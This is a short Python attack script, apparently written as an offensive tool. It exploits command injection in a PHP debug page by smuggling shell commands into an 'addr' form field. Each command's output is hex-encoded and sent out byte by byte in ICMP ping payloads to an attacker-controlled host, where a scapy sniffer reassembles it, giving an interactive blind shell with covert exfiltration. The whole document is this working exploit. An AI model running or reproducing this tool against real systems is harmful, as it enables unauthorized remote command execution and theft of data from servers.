#!/usr/bin/env python3

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Data exfiltration withing Ping where pingPHP is enabled

import scapy.all
from scapy.all import *
import sys
import requests
from threading import Thread
import time

def listener():
	packetsniff = sniff(filter="icmp", iface="wlp3s0", timeout=5)
	newbuf = ''
	for packet in packetsniff:
		if packet.getlayer("ICMP"):
			if str(packet.getlayer(ICMP).type) == "8":
				newbuf += chr(packet.getlayer("Raw").load[-1])
	print (newbuf)

if __name__ == "__main__":
	while True:
		read_line1 = input("$ ")
		read_line = read_line1.strip()
		if read_line == "exit":
			exit()
		else:
			payload = "; " + read_line + " | xxd -ps -c 1 | while read line; do ping -c 1 -p $line 192.168.1.15; done"
			thread = Thread(target=listener)
			main_payload = { 'addr': payload }
			url = 'http://192.168.1.121/debug.php'
			thread.start()
			time.sleep(1)
			post_fields = requests.post(url, main_payload)
			thread.join()
